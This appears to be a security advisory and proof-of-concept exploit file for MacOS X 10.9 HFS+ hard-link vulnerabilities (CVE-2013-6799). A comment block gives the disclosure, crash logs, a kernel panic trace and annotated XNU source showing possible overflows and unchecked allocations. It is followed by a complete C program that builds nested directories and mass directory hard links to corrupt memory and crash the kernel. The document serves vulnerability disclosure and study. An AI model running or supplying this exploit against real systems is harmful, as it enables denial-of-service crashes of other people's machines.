@@ -1,0 +1,570 @@
+/*
+MacOSX/XNU HFS Multiple Vulnerabilities
+Maksymilian Arciemowicz
+http://cxsecurity.com/
+http://cifrex.org/
+
+===================
+
+On November 8th, I've reported vulnerability in hard links for HFS+
+(CVE-2013-6799)
+
+http://cxsecurity.com/issue/WLB-2013110059
+
+The HFS+ file system does not apply strict privilege rules during the
+creating of hard links. The ability to create hard links to directories is
+wrong implemented and such an issue is affecting os versions greater or
+equal to 10.5. Officially Apple allows you to create hard links only for
+your time machine. <see wiki> Vulnerability CVE-2013-6799 (incomplete fix
+for CVE-2010-0105) allow to create hard link to directory and the number of
+hard links may be freely high. To create N hard links, you must use a
+special algorithm which creates links from the top of the file system tree.
+This means that first we create the directory structure and once created we
+need to go from up to down by creating hard links. The last time I've
+mentioned of the possibility of a kernel crash by performing the 'ls'
+command. This situation occurs in conjunction with the 'find' application.
+
+Commands such as 'ls' behave in unexpected ways. Apple are going find this
+crash point in code. To create huge hard links structure, use this code
+
+http://cert.cx/stuff/l2.c
+
+-----------------------------------
+h1XSS:tysiak cx$ uname -a
+Darwin 000000000000000.home 13.1.0 Darwin Kernel Version 13.1.0: Thu Jan 16
+19:40:37 PST 2014; root:xnu-2422.90.20~2/RELEASE_X86_64 x86_64
+h1xss:tysiak cx$ gcc -o l2 l2.c
+h1xss:tysiak cx$ ./l2 1000
+...
+h1xss:tysiak cx$ cat loop.sh
+#!/bin/bash
+while [ 1 ] ; do
+ls -laR B > /dev/null
+done
+
+h1xss:tysiak cx$ sh ./loop.sh
+ls: B: No such file or directory
+ls: X1: No such file or directory
+...
+ls: X8: Bad address
+ls: X1: Bad address
+ls: X2: Bad address
+...
+ls: X8: No such file or directory
+./loop.sh: line 4:  8816 Segmentation fault: 11  ls -laR B > /dev/null
+./loop.sh: line 4:  8818 Segmentation fault: 11  ls -laR B > /dev/null
+ls: B: No such file or directory
+ls: X1: No such file or directory
+ls: X2: No such file or directory
+...
+ls: X1: No such file or directory
+ls: X2: No such file or directory
+-----------
+...
+-----------
+Feb  9 21:16:38 h1xss.home ReportCrash[9419]: Saved crash report for
+ls[9418] version 230 to
+/Users/freak/Library/Logs/DiagnosticReports/ls_2014-02-09-211638_h1XSS.crash
+-----------
+
+That what we can see here is unexpected behavior of LS command. LS process
+is also affected for infinite loop (recursion?).
+
+-----------
+h1xss:tysiak cx$ ps -fp 8822
+  UID   PID  PPID   C STIME   TTY           TIME CMD
+  501  8822  8810   0  7:36   ttys002   62:19.65 ls -laR B
+-----------
+
+or used parallely with (find . > /dev/null) command cause a kernel crash
+
+-----------
+Mon Mar 31 20:30:41 2014
+panic(cpu 0 caller 0xffffff80044dbe2e): Kernel trap at 0xffffff8004768838,
+type 13=general protection, registers:
+CR0: 0x0000000080010033, CR2: 0xffffff8122877004, CR3: 0x0000000001a5408c,
+CR4: 0x00000000001606e0
+RAX: 0xffffff802bc148a0, RBX: 0xdeadbeefdeadbeef, RCX: 0x0000000000008000,
+RDX: 0x0000000000000000
+RSP: 0xffffff8140d9b990, RBP: 0xffffff8140d9b9a0, RSI: 0x0000000000000018,
+RDI: 0xffffff802f23bcd0
+R8:  0xffffff8140d9bc1c, R9:  0xffffff802f26e960, R10: 0xffffff8140d9ba2c,
+R11: 0x0000000000000f92
+R12: 0xffffff801ba1a008, R13: 0xffffff8140d9bb20, R14: 0xffffff802f23bcd0,
+R15: 0xffffff802f26e960
+RFL: 0x0000000000010282, RIP: 0xffffff8004768838, CS:  0x0000000000000008,
+SS:  0x0000000000000010
+Fault CR2: 0xffffff8122877004, Error code: 0x0000000000000000, Fault CPU:
+0x0
+
+Backtrace (CPU 0), Frame : Return Address
+0xffffff811eee8c50 : 0xffffff8004422fa9
+
+BSD process name corresponding to current thread: ls
+-----------
+
+XNU is the computer operating system kernel that Apple Inc. acquired and
+developed for use in the Mac OS X operating system and released as free and
+open source software as part of the Darwin operating system. We can try to
+see HFS implementation code. Let's start static code analysys using
+cifrex.org tool!
+
+-1.---------------------------------------------------------
+Unchecked Return Value to NULL Pointer Dereference in hfs_vfsops.c
+
+Code:
+http://opensource.apple.com/source/xnu/xnu-2422.1.72/bsd/hfs/hfs_vfsops.c
+
+--- hfs_vfsops.c ----------------------------
+/*
+ * HFS filesystem related variables.
+ 
+int
+hfs_sysctl(int *name, __unused u_int namelen, user_addr_t oldp, size_t
+*oldlenp,
+user_addr_t newp, size_t newlen, vfs_context_t context)
+{
+...
+       if ((newlen <= 0) || (newlen > MAXPATHLEN))
+            return (EINVAL);
+
+        bufsize = MAX(newlen * 3, MAXPATHLEN);
+        MALLOC(filename, char *, newlen, M_TEMP, M_WAITOK);
+        if (filename == NULL) { <=====================================
+filename CHECK
+            error = ENOMEM;
+            goto encodinghint_exit;
+        }
+        MALLOC(unicode_name, u_int16_t *, bufsize, M_TEMP, M_WAITOK);
+        if (filename == NULL) { <======================================
+double CHECK?
+            error = ENOMEM;
+            goto encodinghint_exit;
+        }
+
+        error = copyin(newp, (caddr_t)filename, newlen);
+        if (error == 0) {
+            error = utf8_decodestr((u_int8_t *)filename, newlen - 1,
+unicode_name,
+                                   &bytes, bufsize, 0, UTF_DECOMPOSED);
+            if (error == 0) {
+                hint = hfs_pickencoding(unicode_name, bytes / 2);
+                error = sysctl_int(oldp, oldlenp, USER_ADDR_NULL, 0,
+(int32_t *)&hint);
+            }
+        }
+--- hfs_vfsops.c----------------------------
+
+Twice checking of 'filename' has no sense. Probably 'unicode_name' should
+be checked in second condition.
+
+
+-2.---------------------------------------------------------
+Possible Buffer Overflow in resource fork (hfs_vnops.c)
+
+Unverified value returned by snprintf() may be bigger as a declared buffer
+(MAXPATHLEN).
+
+
+https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man3/snprintf.3.html
+---
+The snprintf() and vsnprintf() functions will write at most n-1 of the
+characters printed into the out-put output
+     put string (the n'th character then gets the terminating `\0'); if the
+return value is greater than or
+     equal to the n argument, the string was too short and some of the
+printed characters were discarded.
+     The output is always null-terminated.
+---
+
+
+Code:
+http://opensource.apple.com/source/xnu/xnu-2422.1.72/bsd/hfs/hfs_vnops.c
+
+--- hfs_vnops.c ----------------------------
+...
+/*
+ * hfs_vgetrsrc acquires a resource fork vnode corresponding to the cnode
+that is
+ * found in 'vp'.  The rsrc fork vnode is returned with the cnode locked
+and iocount
+ * on the rsrc vnode.
+ *
+ ...
+ 
+
+int
+hfs_vgetrsrc(struct hfsmount *hfsmp, struct vnode *vp, struct vnode **rvpp,
+int can_drop_lock, int error_on_unlinked)
+{
+
+...
+
+/*
+ * Supply hfs_getnewvnode with a component name.
+ 
+cn.cn_pnbuf = NULL;
+if (descptr->cd_nameptr) {
+            MALLOC_ZONE(cn.cn_pnbuf, caddr_t, MAXPATHLEN, M_NAMEI,
+M_WAITOK);
+            cn.cn_nameiop = LOOKUP;
+            cn.cn_flags = ISLASTCN | HASBUF;
+            cn.cn_context = NULL;
+            cn.cn_pnlen = MAXPATHLEN;
+            cn.cn_nameptr = cn.cn_pnbuf;
+            cn.cn_hash = 0;
+            cn.cn_consume = 0;
+            cn.cn_namelen = snprintf(cn.cn_nameptr, MAXPATHLEN,
+<================
+                         "%s%s", descptr->cd_nameptr,
+                         _PATH_RSRCFORKSPEC);
+        }
+        dvp = vnode_getparent(vp);
+        error = hfs_getnewvnode(hfsmp, dvp, cn.cn_pnbuf ? &cn : NULL,
+<================
+                                descptr, GNV_WANTRSRC | GNV_SKIPLOCK,
+&cp->c_attr,
+                                &rsrcfork, &rvp, &newvnode_flags);
+
+--- hfs_vnops.c ----------------------------
+
+Pattern is '%s%s' where sum of length descptr->cd_nameptr and
+_PATH_RSRCFORKSPEC may be bigger as a declared buffer size (MAXPATHLEN).
+Size of descptr->cd_nameptr is MAXPATHLEN and value _PATH_RSRCFORKSPEC is
+
+  #define _PATH_RSRCFORKSPEC     "/..namedfork/rsrc"
+
+where length is 17 chars. Possible up to 17 chars overflow here?.
+
+Now let's see hfs_getnewvnode function
+
+http://opensource.apple.com/source/xnu/xnu-2422.1.72/bsd/hfs/hfs_cnode.c
+
+--- hfs_cnode.c ----------------------------
+hfs_getnewvnode(
+    struct hfsmount *hfsmp,
+    struct vnode *dvp,
+    struct componentname *cnp, <======== WATCH THIS
+    struct cat_desc *descp,
+    int flags,
+    struct cat_attr *attrp,
+    struct cat_fork *forkp,
+    struct vnode **vpp,
+    int *out_flags)
+{
+...
+                if ((*vpp != NULL) && (cnp)) {
+                    /* we could be requesting the rsrc of a hardlink
+file... 
+                    vnode_update_identity (*vpp, dvp, cnp->cn_nameptr,
+cnp->cn_namelen, cnp->cn_hash, <== NAMELEN HERE
+                            (VNODE_UPDATE_PARENT | VNODE_UPDATE_NAME));
+...
+--- hfs_cnode.c ----------------------------
+
+and call to vnode_update_indentity()
+
+http://opensource.apple.com/source/xnu/xnu-2422.1.72/bsd/vfs/vfs_cache.c
+
+
+--- vfs_cache.c ----------------------------
+void
+vnode_update_identity(vnode_t vp, vnode_t dvp, const char *name, int
+name_len, uint32_t name_hashval, int flags)
+{
+...
+    if ( (flags & VNODE_UPDATE_NAME) ) {
+        if (name != vp->v_name) {
+            if (name && *name) {
+                if (name_len == 0)
+                    name_len = strlen(name);
+                tname = vfs_addname(name, name_len, name_hashval, 0); <==
+NAMELEN HERE
+            }
+        } else
+            flags &= ~VNODE_UPDATE_NAME;
+    }
+...
+const char *
+vfs_addname(const char *name, uint32_t len, u_int hashval, u_int flags)
+{
+    return (add_name_internal(name, len, hashval, FALSE, flags));  <== CALL
+
+}
+--- vfs_cache.c ----------------------------
+
+And invalid memory reference in add_name_internal()
+
+--- vfs_cache.c ----------------------------
+static const char *
+add_name_internal(const char *name, uint32_t len, u_int hashval, boolean_t
+need_extra_ref, __unused u_int flags)
+{
+    struct stringhead *head;
+    string_t          *entry;
+    uint32_t          chain_len = 0;
+    uint32_t      hash_index;
+        uint32_t      lock_index;
+    char              *ptr;
+
+    /*
+     * if the length already accounts for the null-byte, then
+     * subtract one so later on we don't index past the end
+     * of the string.
+     
+    if (len > 0 && name[len-1] == '\0') { <===== INVALID MEMORY REFERENCE
+        len--;
+    }
+    if (hashval == 0) {
+        hashval = hash_string(name, len);
+    }
+--- vfs_cache.c ----------------------------
+
+
+-3.---------------------------------------------------------
+Unchecked Return Value to NULL Pointer Dereference hfs_catalog.c and not
+only
+
+Please pay attention that a buffer length check (stored in some variable)
+should be performed; also return from *alloc() function family should be
+verified for possible NULL pointers.
+Here are a few FALSE / POSITIVE examples.
+
+http://opensource.apple.com/source/xnu/xnu-2422.1.72/bsd/hfs/hfs_catalog.c
+
+--- hfs_catalog.c ----------------------------
+ /*
+ * builddesc - build a cnode descriptor from an HFS+ key
+ 
+static int
+builddesc(const HFSPlusCatalogKey *key, cnid_t cnid, u_int32_t hint,
+u_int32_t encoding,
+    int isdir, struct cat_desc *descp)
+{
+    int result = 0;
+    unsigned char * nameptr;
+    size_t bufsize;
+    size_t utf8len;
+    unsigned char tmpbuff[128];
+
+    /* guess a size... 
+    bufsize = (3 * key->nodeName.length) + 1;
+    if (bufsize >= sizeof(tmpbuff) - 1) { <============================
+        MALLOC(nameptr, unsigned char *, bufsize, M_TEMP, M_WAITOK); <=
+MALLOC FAIL
+    } else {
+        nameptr = &tmpbuff[0];
+    }
+
+    result = utf8_encodestr(key->nodeName.unicode,
+            key->nodeName.length * sizeof(UniChar),
+            nameptr, (size_t *)&utf8len, <============================
+
+...
+    maxlinks = MIN(entrycnt, (u_int32_t)(uio_resid(uio) /
+SMALL_DIRENTRY_SIZE));
+bufsize = MAXPATHLEN + (maxlinks * sizeof(linkinfo_t)) + sizeof(*iterator);
+if (extended) {
+bufsize += 2*sizeof(struct direntry);
+}
+MALLOC(buffer, void *, bufsize, M_TEMP, M_WAITOK);
+<============================
+bzero(buffer, bufsize);
+...
+FREE(nameptr, M_TEMP);
+MALLOC(nameptr, unsigned char *, bufsize, M_TEMP, M_WAITOK); <==============
+
+result = utf8_encodestr(key->nodeName.unicode,
+                        key->nodeName.length * sizeof(UniChar),
+                        nameptr, (size_t *)&utf8len,
+                        bufsize, ':', 0);
+}
+ ...
+cnp = (const CatalogName *)&ckp->hfsPlus.nodeName;
+bufsize = 1 + utf8_encodelen(cnp->ustr.unicode,
+                             cnp->ustr.length * sizeof(UniChar),
+                             ':', 0);
+MALLOC(new_nameptr, u_int8_t *, bufsize, M_TEMP, M_WAITOK); <========
+result = utf8_encodestr(cnp->ustr.unicode,
+                        cnp->ustr.length * sizeof(UniChar),
+                        new_nameptr, &tmp_namelen, bufsize, ':', 0);
+
+--- hfs_catalog.c ----------------------------
+
+The above examples does not look nice, too. Are you among them is the crux
+of the problem applications and kernel crash?
+I informed Apple of those possible errors, it has passed more than a month
+and I still have not received any comment nor solution.
+
+
+--- 1. References ---
+http://cxsecurity.com/issue/WLB-2014040027
+http://cxsecurity.com/cveshow/CVE-2013-6799/
+http://cxsecurity.com/cveshow/CVE-2010-0105/
+
+
+--- 2. Greetz ---
+Kacper George and Michal
+
+
+--- 3. Credit ---
+Maksymilian Arciemowicz
+http://cxsecurity.com/
+http://cifrex.org/
+http://cert.cx/
+
+Best regards,
+CXSEC TEAM
+http://cxsec.org/
+
+*/
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/param.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <err.h>
+#include <errno.h>
+#include <locale.h>
+
+/*
+
+MacOS X 10.9 Hard Link Memory Corruption PoC
+Maksymilian Arciemowicz 
+http://cxsecurity.com/
+http://cert.cx/
+
+*/
+int mkpath(char *path, mode_t mode, mode_t dir_mode){
+
+struct stat sb;
+char *slash;
+int done,rv;
+
+done=0;
+slash=path;
+
+for(;;){
+slash += strspn(slash,"/");
+slash += strcspn(slash,"/");
+
+done = (*slash=='\0');
+*slash = '\0';	
+
+rv = mkdir(path, done ? mode : dir_mode);
+if(rv < 0){
+int sverrno;
+
+sverrno = errno;
+
+if(stat(path,&sb)<0){
+errno=sverrno;
+warn("%s",path);
+return -1;
+}
+
+if(!S_ISDIR(sb.st_mode)){
+errno = ENOTDIR;
+warn("%s",path);
+return -1;
+}
+} else if (done){
+if((chmod(path,mode)== -1)) {
+warn("%s",path);
+return -1;
+}
+}
+
+if(done){
+break;
+}
+
+*slash = '/';
+}
+
+return 0;
+}
+
+int main(int argc, char *argv[]){
+
+if(argc!=2){
+printf("Use it with (int)arg[1]\n");
+return 1;
+}
+
+int wbita=atoi(argv[1]);
+
+char symn1[]="X1\0";
+char symn2[]="X2\0";
+char symn3[]="X3\0";
+char symn4[]="X4\0";
+char symn5[]="X5\0";
+char symn6[]="X6\0";
+char symn7[]="X7\0";
+char symn8[]="X8\0";
+char buff[]="B\0";
+char cd[]="..\0";
+char *sym;
+
+FILE *fp;
+
+int level=0;
+mode_t mode,dir_mode;
+
+sym=malloc(((strlen(buff)*2)+2)*sizeof(char));
+
+mode = ((S_IRWXU | S_IRWXG | S_IRWXO) & ~umask(0));
+dir_mode = mode | S_IWUSR |S_IXUSR;
+
+mkpath(buff,mode,dir_mode);
+
+while(1) // Phase 0
+if(0!=chdir(buff)){
+printf("Phase 0 done\n");
+break;
+}
+else printf("Next %i\n",level++);
+
+strcpy(sym,buff);
+strcat(sym,"/");
+strcat(sym,buff);
+
+for(int ax=level; ax<wbita; ax++){
+mkpath(buff,mode,dir_mode);
+
+printf("Directory created Level: %i\n",ax);
+
+if(0!=chdir(buff)){
+printf("Error. chdir() failed.");
+break;
+}
+}
+
+mkpath(buff,mode,dir_mode);
+chdir(buff);
+mkpath(buff,mode,dir_mode);
+chdir(cd);
+
+//Let's create hardlinks and cd .. loop
+
+for(int ax=level; ax<wbita; ax++){
+
+printf("Link1(%s,%s)=%i; cd ..\n",sym,symn1,link(sym,symn1));
+printf("Link2(%s,%s)=%i; cd ..\n",sym,symn2,link(sym,symn2));
+printf("Link3(%s,%s)=%i; cd ..\n",sym,symn3,link(sym,symn3));
+printf("Link4(%s,%s)=%i; cd ..\n",sym,symn4,link(sym,symn4));
+printf("Link5(%s,%s)=%i; cd ..\n",sym,symn5,link(sym,symn5));
+printf("Link6(%s,%s)=%i; cd ..\n",sym,symn6,link(sym,symn6));
+printf("Link7(%s,%s)=%i; cd ..\n",sym,symn7,link(sym,symn7));
+printf("Link8(%s,%s)=%i; cd ..\n",sym,symn8,link(sym,symn8));
+
+if(0!=chdir(cd)){
+printf("Error. chdir failed!");
+break;
+}
+}
+return 0;
+}
